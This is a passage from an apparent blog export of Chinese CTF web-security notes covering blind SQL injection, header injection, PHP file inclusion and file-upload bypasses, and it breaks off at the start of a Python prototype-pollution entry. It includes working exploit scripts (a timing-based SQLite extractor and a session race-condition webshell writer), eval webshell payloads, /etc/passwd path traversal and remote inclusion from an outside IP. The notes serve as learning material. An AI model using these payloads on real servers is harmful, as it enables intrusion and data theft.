&quot;-1&#x27;/**/or/**/(case/**/when(substr((select/**/hex(group_concat(sql))/**/from/**/sqlite_master),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;)/**/then/**/randomblob(300000000)/**/else/**/0/**/end)/*&quot;.format(i,chr(mid))</span></span><br><span class="line">        datas = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:<span class="string">&quot;123&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line"> <span class="comment"># print(datas)</span></span><br><span class="line">        start_time=time.time()</span><br><span class="line">        res = requests.post(url=url,json=datas)</span><br><span class="line">        end_time=time.time()</span><br><span class="line">        spend_time=end_time-start_time</span><br><span class="line">        <span class="keyword">if</span> spend_time&gt;=<span class="number">0.19</span>:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid ==<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>+<span class="built_in">bytes</span>.fromhex(flag).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>





<h1 id="过滤："><a href="#过滤：" class="headerlink" title="过滤："></a>过滤：</h1><h2 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h2><ul>
<li>注释绕过<br>select&#x2F;<strong>&#x2F;user()&#x2F;</strong>&#x2F;from&#x2F;**&#x2F;dual</li>
<li>括号绕过<br>(sleep(ascii(mid(user()from(2)for(1)))&#x3D;109))</li>
<li>%0a绕过</li>
</ul>
<h2 id="union-select-其他"><a href="#union-select-其他" class="headerlink" title="union&#x2F;select&#x2F;其他"></a>union&#x2F;select&#x2F;其他</h2><ul>
<li>大小写</li>
<li>编码绕过</li>
<li>注释绕过</li>
</ul>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul>
<li>详见:</li>
</ul>
<p><a href="https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#%E8%BF%87%E6%BB%A4unionselectwhere%E7%AD%89">https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#%E8%BF%87%E6%BB%A4unionselectwhere%E7%AD%89</a></p>
<h1 id="堆叠过滤："><a href="#堆叠过滤：" class="headerlink" title="堆叠过滤："></a>堆叠过滤：</h1><ol>
<li>条件：<ul>
<li>能用；分割，执行多行sql代码</li>
</ul>
</li>
<li>常用函数：<blockquote>
<p>show tables&#x2F;columns from table; &#x2F;&#x2F;展示行列<br>insert into&#x2F;replace into users(id,username,password) values (‘100’,’new’,’new’); &#x2F;&#x2F;插入行<br>delete from table_name where condition &#x2F;&#x2F;从表中删除符合where条件的行<br>其他见：<a href="https://www.runoob.com/mysql/mysql-delete-query.html">https://www.runoob.com/mysql/mysql-delete-query.html</a></p>
</blockquote>
</li>
</ol>
<h1 id="其他注入点"><a href="#其他注入点" class="headerlink" title="其他注入点"></a>其他注入点</h1><h2 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h2><ol>
<li><p>条件:</p>
<ul>
<li>对get和post进行了过滤,但是没对cookie提交的数据库进行过滤</li>
<li>对程序提交数据的获取方式没有具体指定(可以是cookie提交的数据)</li>
</ul>
</li>
<li><p>同普通sql</p>
</li>
<li><p>Cookie: id&#x3D;-1 union select 1,ebwkxmpupc from mgzotsomsk;</p>
</li>
</ol>
<h2 id="user-agent注入"><a href="#user-agent注入" class="headerlink" title="user-agent注入"></a>user-agent注入</h2><p>User-Agent: -1 union select group_concat(column_name),1 from information_schema.columns where table_name &#x3D; pzpocrkbep</p>
<h2 id="referer注入"><a href="#referer注入" class="headerlink" title="referer注入"></a>referer注入</h2><p>Referer: id&#x3D;-1 union select 1,oksgticxdv from pzpocrkbep</p>
<h4 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h4><p><a href="https://www.freebuf.com/articles/web/404072.html">https://www.freebuf.com/articles/web/404072.html</a></p>
]]></content>
      <categories>
        <category>web漏洞</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
        <tag>注入</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含&amp;文件上传(主php)</title>
    <url>/2025/06/22/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&amp;%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="常见函数："><a href="#常见函数：" class="headerlink" title="常见函数："></a>常见函数：</h2><ul>
<li>include&#x2F;include_once(出错发警告)</li>
<li>require&#x2F;require_once(出错直接退出)<br>可以读取文件内容或者执行代码</li>
</ul>
<h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><h3 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">	<span class="keyword">include</span> (<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd(获取文件内容)<br>file&#x3D;phpinfo.txt(<?phpinfo();?>)<br>file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system('ls');?><br>file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<h3 id="session条件竞争"><a href="#session条件竞争" class="headerlink" title="session条件竞争"></a>session条件竞争</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[file];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ol>
<li><p>条件：</p>
<p> session.upload_progress.enabled &#x3D; on:该参数设置为On时，才会进行<strong>文件上传进度</strong>的记录。</p>
<p> session.upload_progress.cleanup &#x3D; on:该参数开启时，会在文件上传结束时对用户session内容进行自动清除。</p>
<p> session.upload_progress.name &#x3D; “PHP_SESSION_UPLOAD_PROGRESS”:    该参数与prefix作为我们的键名。方便我们的shell编写，可控。</p>
<p> session.upload_progress.prefix &#x3D; “upload_progress_”:该参数表示与name一起构成我们的键名。</p>
</li>
<li><p>攻击步骤：</p>
<ul>
<li>post模拟文件上传，从而达到shell写入的目的</li>
</ul>
<blockquote>
<p>cookie &#x3D; {‘PHPSESSID’:sessid},<br>&#x2F;&#x2F;生成文件名为sess_sessid<br>data &#x3D; {“PHP_SESSION_UPLOAD_PROGRESS”:”<?php eval($_POST[1]);?>“}<br>&#x2F;&#x2F;写入文件后为 upload_progress _ <?php eval($_POST[1]);?><br>files &#x3D; {‘file’:(‘k1he.txt’,f)}<br>&#x2F;&#x2F;会显示再session文件中，可以作为成功上传的凭证</p>
</blockquote>
<ul>
<li>再转移到session文件目录，读取页面<blockquote>
<p>&#x2F;var&#x2F;lib&#x2F;php&#x2F;<br>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;<br>&#x2F;tmp&#x2F;<br>&#x2F;tmp&#x2F;sessions&#x2F;<br>&#x2F;&#x2F;常见session文件目录</p>
</blockquote>
</li>
</ul>
</li>
<li><p>脚本：</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-08-23 18:08:10</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-08-23 20:19:18</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;k1he&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://a0c9ce43-6c4d-4b28-aa61-1c7a6eb40879.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>* <span class="number">1024</span> * <span class="number">50</span>)                     <span class="comment">#创建文件</span></span><br><span class="line">        response = session.post(                            <span class="comment">#post文件上传</span></span><br><span class="line">            url,                                            <span class="comment">#url</span></span><br><span class="line">            cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;,                   <span class="comment">#设置cookie为我们的sessid</span></span><br><span class="line">            data = &#123; <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php system(&#x27;cat *fl0g.php&#x27;);?&gt;&quot;</span>&#125;,<span class="comment">#写马或执行内容</span></span><br><span class="line">            files = &#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;k1he.txt&#x27;</span>,f)&#125;                 <span class="comment">#上传文的具体内容，文件名和文件内容</span></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        payload = <span class="string">&quot;?file=/tmp/sess_&quot;</span>+sessid                 <span class="comment">#包含我们的session路径</span></span><br><span class="line"></span><br><span class="line">        response = session.get(url = url+payload)           <span class="comment">#读取页面</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;k1he.txt&#x27;</span> <span class="keyword">in</span> response.text:                     <span class="comment">#返回页面</span></span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            event.clear</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*]retrying!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:                                  </span><br><span class="line"><span class="comment">#一直上传，且双线程运行,使得内容来不及被删除</span></span><br><span class="line">    event = threading.Event()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="中间件日志文件包含"><a href="#中间件日志文件包含" class="headerlink" title="中间件日志文件包含"></a>中间件日志文件包含</h3><ol>
<li><p>条件：<br>web中间件日志文件的存储位置已知，并且具有可读权限(&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log)</p>
</li>
<li><p>攻击步骤：</p>
<ul>
<li>访问<a href="http://www.abc.com/xxx/">http://www.abc.com/xxx/</a><?php @eval($_POST[123]);?>或者改ua头<br>(将恶意代码写入到日志文件，日志文件会记录访问者的各种信息)</li>
<li>访问<a href="http://www.abc.com/xxx/file.php?file=../../../var/log/httpd/access_log">http://www.abc.com/xxx/file.php?file=../../../var/log/httpd/access_log</a> (文件包含日志文件)&amp;123&#x3D;system(‘tac fl0g.php’);phpinfo();</li>
</ul>
</li>
</ol>
<h3 id="SSH日志文件包含"><a href="#SSH日志文件包含" class="headerlink" title="SSH日志文件包含"></a>SSH日志文件包含</h3><ol>
<li><p>条件：<br>SSH日志路径已知，并且具有可读权限(&#x2F;var&#x2F;log&#x2F;auth.log)</p>
</li>
<li><p>攻击步骤：</p>
<ul>
<li>ssh “<?php @eval($_POST[123]);?>“@192.168.1.1</li>
<li><a href="http://192.168.1.1/xxx/file.php?file=../../../var/log/auth.log">http://192.168.1.1/xxx/file.php?file=../../../var/log/auth.log</a></li>
</ul>
</li>
</ol>
<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><ol>
<li>条件：<br>allow_url_fopen&#x3D;on<br>allow_url_include&#x3D;on</li>
<li>攻击步骤：<ul>
<li>?file&#x3D;<a href="http://192.168.2.1/php.txt">http://192.168.2.1/php.txt</a></li>
</ul>
</li>
</ol>
<h2 id="常见敏感文件："><a href="#常见敏感文件：" class="headerlink" title="常见敏感文件："></a>常见敏感文件：</h2><ul>
<li>windows：<table>
<thead>
<tr>
<th align="center">目录</th>
<th align="center">内容</th>
</tr>
</thead>
<tbody><tr>
<td align="center">\boot.ini</td>
<td align="center">系统版本信息</td>
</tr>
<tr>
<td align="center">\xxx\php.ini</td>
<td align="center">PHP配置信息</td>
</tr>
<tr>
<td align="center">\xxx\my.ini</td>
<td align="center">MYSQL配置信息</td>
</tr>
<tr>
<td align="center">\xxx\httpd.conf、</td>
<td align="center">Apache配置信息</td>
</tr>
</tbody></table>
</li>
<li>linux:<table>
<thead>
<tr>
<th align="center">目录</th>
<th align="center">内容</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&#x2F;etc&#x2F;passwd</td>
<td align="center">Linux系统账号信息</td>
</tr>
<tr>
<td align="center">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</td>
<td align="center">Apache配置信息</td>
</tr>
<tr>
<td align="center">&#x2F;etc&#x2F;my.conf</td>
<td align="center">MySQL配置信息</td>
</tr>
<tr>
<td align="center">&#x2F;usr&#x2F;etc&#x2F;php.ini</td>
<td align="center">PHP配置信息</td>
</tr>
</tbody></table>
</li>
</ul>
<h2 id="php伪协议："><a href="#php伪协议：" class="headerlink" title="php伪协议："></a>php伪协议：</h2><p>文件操纵函数&#x2F;处理流数据的函数(文件路径&#x2F;url)</p>
<ul>
<li><p>php:&#x2F;&#x2F;伪协议：</p>
<ol>
<li><p>php:&#x2F;&#x2F;filter(对本地磁盘文件进行读写)</p>
<ul>
<li><p>filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</p>
</li>
<li><p>?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;xxx.php</p>
</li>
</ul>
</li>
<li><p>php:&#x2F;&#x2F;input(post传入什么就回显什么)</p>
<ul>
<li><p>echo file_get_contents(“php:&#x2F;&#x2F;input”);  </p>
</li>
<li><p>http”&#x2F;&#x2F;<a href="http://www.abc.com/xxx/file.php?file=php://input">www.abc.com/xxx/file.php?file=php://input</a><br>&amp; post传入<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST[cmd])?>‘);?&gt;</p>
</li>
<li><p>http”&#x2F;&#x2F;<a href="http://www.abc.com/xxx/file.php?file=php://input">www.abc.com/xxx/file.php?file=php://input</a><br>&amp; post传入<?php system('ls');?></p>
</li>
</ul>
</li>
</ol>
</li>
<li><p>file: &#x2F;&#x2F;伪协议(可以访问本地文件系统，读取本地文件的内容)<br>  ?file&#x3D;file:&#x2F;&#x2F;&#x2F;c:&#x2F;boot.ini</p>
</li>
<li><p>data:&#x2F;&#x2F; 伪协议(数据流的读取)<br>  data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxxx(base64编码后的数据，需要对加号进行URL编码：%2b)<br>  data:&#x2F;&#x2F;text&#x2F;plain,<?php system('ls');?></p>
</li>
<li><p>phar:&#x2F;&#x2F;伪协议(解压的伪协议)<br>  ?file&#x3D;phar:&#x2F;&#x2F;压缩包&#x2F;压缩文件<br>  ?file&#x3D;phar:&#x2F;&#x2F;shell.png&#x2F;shell.php (png当做zip压缩包进行解压，并且访问解压后的shell.php文件)</p>
</li>
</ul>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="漏洞利用：-1"><a href="#漏洞利用：-1" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><h3 id="前端js校验："><a href="#前端js校验：" class="headerlink" title="前端js校验："></a>前端js校验：</h3><ul>
<li>在console中，破坏函数&#x2F;修改js添加白名单&#x2F;删除js黑名单</li>
<li>使用浏览器插件禁用js</li>
</ul>
<h3 id="检查后缀："><a href="#检查后缀：" class="headerlink" title="检查后缀："></a>检查后缀：</h3><hr>
<h4 id=""><a href="#" class="headerlink" title="&lt;**黑名单**&gt;"></a>&lt;**黑名单**&gt;</h4><h5 id="user-ini："><a href="#user-ini：" class="headerlink" title=".user.ini："></a>.user.ini：</h5><ul>
<li><p>条件：同目录下有要执行的php文件,用蚁剑链接的时候注意路径正确(url&#x2F;upload&#x2F;index.php)</p>
</li>
<li><p>上传.user.ini,写入:</p>
<p>​    auto_append_file &#x3D; 1.txt(包含在文件尾)</p>
<p>​    auto_prepend_file &#x3D; 1.txt&#x2F;url(包含在文件头)</p>
<p>将1.txt包含到要执行的php文件中,使得在执行php文件同时执行1.txt，相当于文件包含，还可以包含远程文件</p>
</li>
</ul>
<h5 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess:"></a>.htaccess:</h5><ul>
<li><p>条件：apache 服务器</p>
</li>
<li><p>上传.htaccess文件，写入：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;webshell.jpg&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">    <span class="comment">//对当前目录下的webshell.jpg执行php解析</span></span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">    </span><br><span class="line">AddType application/x-httpd-php .gif</span><br><span class="line"><span class="comment">//.gif后缀文件当作php解析</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>如果使用<code>exif_imagetype</code>检测上传的文件的第一个字节来判断文件类型，那么只要是图像格式以<code>#</code>或<code>0x00</code>开头便可绕过</p>
<p>(正好.htaccess 通过 <code>#</code> 来注释, 后来了解到还有 <code>\x00</code>)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#define width 1</span></span><br><span class="line"><span class="comment">#define height 1</span></span><br><span class="line">&lt;FilesMatch <span class="string">&quot;hey.hey&quot;</span>&gt;</span><br><span class="line">SetHandler  application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="过滤php："><a href="#过滤php：" class="headerlink" title="过滤php："></a>过滤php：</h5><ul>
<li>可以用特殊后缀名：</li>
</ul>
<blockquote>
<p>Php|php2|php3|php4|php5|php6|php7|pht|phtm| <strong>phtml</strong></p>
</blockquote>
<ul>
<li>可以用长标签：</li>
</ul>
<script language='php'>evalxxxx;</script>

<ul>
<li>可以用短标签：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">=@eval(@$_POST[&#x27;ctf&#x27;]);</span><br><span class="line">//@是错误抑制符，=相当于php echo</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>关于短标签：</li>
</ul>
<p><img src="/..%5Cimages%5Ca01af52b7d1925b10adc1a52c3448fb.png"></p>
<h5 id="双写绕过-xx-phphpp"><a href="#双写绕过-xx-phphpp" class="headerlink" title="双写绕过:xx.phphpp"></a>双写绕过:xx.phphpp</h5><h5 id="绕过-move-uploaded-file-pathinfo"><a href="#绕过-move-uploaded-file-pathinfo" class="headerlink" title="&#x2F;.绕过:move_uploaded_file+pathinfo"></a>&#x2F;.绕过:move_uploaded_file+pathinfo</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;url.php&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;url.php/.hh&#x27;</span>;</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$a</span>, PATHINFO_EXTENSION);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$file_ext</span>;  <span class="comment">#php</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$b</span>, PATHINFO_EXTENSION);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$file_ext</span>;  <span class="comment">#hh</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#且move_uploaded_file会自动去除/.中的.</span></span><br><span class="line">就可以传入name=<span class="number">1</span>.php/.来绕过php后缀检测，同时文件保存时会被保存为php文件</span><br></pre></td></tr></table></figure>

<h5 id="配合解析漏洞"><a href="#配合解析漏洞" class="headerlink" title="配合解析漏洞:"></a>配合解析漏洞:</h5><ul>
<li><p>Apache HTTPD 换行解析漏洞:<code>1.php\x0A</code>将被按照PHP后缀进行解析</p>
</li>
<li><p>Apache HTTPD 多后缀解析漏洞:支持一个文件拥有多个后缀xxx.php.7z会被识别成php文件</p>
</li>
<li><p>Nginx 解析漏洞:文件后缀加上&#x2F;.php会当成php被解析</p>
</li>
<li><p>IIS7.5解析漏洞:在上传的文件名后面加上<code>/.php</code>，可以被作为PHP文件解析</p>
</li>
<li><p>tomcat任意文件上传漏洞，test.jsp&#x2F; 识别为非jsp文件，但是后续保存为test.jsp文件</p>
</li>
<li><p>IIS6解析漏洞:</p>
<p>在<code>.asp</code>、<code>.asa</code>目录下的任意文件都会以<code>asp</code>格式解析;</p>
<p>上传<code>test.asp;.jpg</code>会被解析为asp;</p>
<p>IIS 6.0默认的可执行文件除了<code>asp</code>还包含<code>asa</code>、<code>cer</code>、<code>cdx</code>，会将这三种扩展名文件解析为asp文件</p>
</li>
</ul>
<h5 id="服务器windows平台："><a href="#服务器windows平台：" class="headerlink" title="服务器windows平台："></a>服务器windows平台：</h5><table>
<thead>
<tr>
<th>上传文件名</th>
<th>服务器文件名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>file.php[空格]</td>
<td>file.php</td>
<td></td>
</tr>
<tr>
<td>file.php[.]</td>
<td>file.php</td>
<td>无论多少个.都可以</td>
</tr>
<tr>
<td>file.php[%80-%99]</td>
<td>file.php</td>
<td>Burp抓包，在文件名结尾输%80，CTRL+SHIFT+U进行URL-DECODE,或者增加一个空格，再在HEX视图中把20修改为80</td>
</tr>
<tr>
<td>file.php::$DATA</td>
<td>file.php</td>
<td>file.php中的实际内容</td>
</tr>
</tbody></table>
<hr>
<h4 id="-1"><a href="#-1" class="headerlink" title="&lt;**白名单**&gt;"></a>&lt;**白名单**&gt;</h4><h5 id="MIME检查"><a href="#MIME检查" class="headerlink" title="MIME检查:"></a>MIME检查:</h5><ul>
<li><p>抓包,改文件名&#x2F;文件类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: image/gif`或`Content-Type: image/jpeg`或`Content-Type: image/png</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="00-0x0a-0x00截断"><a href="#00-0x0a-0x00截断" class="headerlink" title="%00,0x0a,0x00截断:"></a>%00,0x0a,0x00截断:</h5><ul>
<li>条件:：白名单、上传路径可控、php.ini中的<code>magic_quotes_gpc</code>为off</li>
<li>..&#x2F;upload&#x2F;5920201223231032.gif; →  ..&#x2F;upload&#x2F;xxx.php%00&#x2F;5920201223231032.gif</li>
</ul>
<h3 id="检查内容"><a href="#检查内容" class="headerlink" title="检查内容:"></a>检查内容:</h3><h4 id="exif-imagetype文件头检查"><a href="#exif-imagetype文件头检查" class="headerlink" title="exif_imagetype文件头检查:"></a>exif_imagetype文件头检查:</h4><p>gif的文件头为<code>GIF89a</code>；<code>png</code>的文件头为<code>89504E47</code>；<code>jpg</code>的文件头为<code>FFD8FF</code></p>
<h4 id="png二次渲染："><a href="#png二次渲染：" class="headerlink" title="png二次渲染："></a>png二次渲染：</h4><p>生成图片马（<?=$_GET[0]($_POST[1]);?>）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 原始 RGB 颜色数据</span></span><br><span class="line">p = [</span><br><span class="line">    <span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">    <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">    <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">    <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">    <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">    <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">    <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 32x32 图片</span></span><br><span class="line">img = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">32</span>, <span class="number">32</span>), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">pixels = img.load()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 依次填充像素点</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(p) - <span class="number">2</span>, <span class="number">3</span>):</span><br><span class="line">    x = i // <span class="number">3</span>  <span class="comment"># 计算 X 坐标</span></span><br><span class="line">    <span class="keyword">if</span> x &gt;= <span class="number">32</span>:  <span class="comment"># 避免超出图片宽度</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    r, g, b = p[i], p[i + <span class="number">1</span>], p[i + <span class="number">2</span>]</span><br><span class="line">    pixels[x, <span class="number">0</span>] = (r, g, b)  <span class="comment"># 仅绘制第一行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存图片</span></span><br><span class="line">img.save(<span class="string">&quot;1.png&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;图片已保存为 1.png&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="其他"><a href="#其他" class="headerlink" title="其他:"></a>其他:</h2><ul>
<li>过滤[],{}代替;过滤.用\2e</li>
<li>$_REQUEST绕过:<?php $_REQUEST[1]($_REQUEST[2])?></li>
<li>反引号来进行命令执行：<?=`tac ../f*`?></li>
<li>利用文件包含漏洞,包含日志&lt;&#x3D;include”&#x2F;var&#x2F;lo”.”g&#x2F;nginx&#x2F;access.l”.”og”?&gt;</li>
<li>远程文件包含：ip可以转数字，绕过.限制</li>
<li>有时会使原文件被覆盖，可用来修改服务器配置……</li>
<li>unzip可以配合软链接</li>
</ul>
]]></content>
      <categories>
        <category>web漏洞</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>py原型链污染</title>
    <url>/2025/06/22/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><ul>
<li>污染只对类的属性起作用，对于类方法是无效的</li>
<li>可以对全局属性进行污染</li>
</ul>
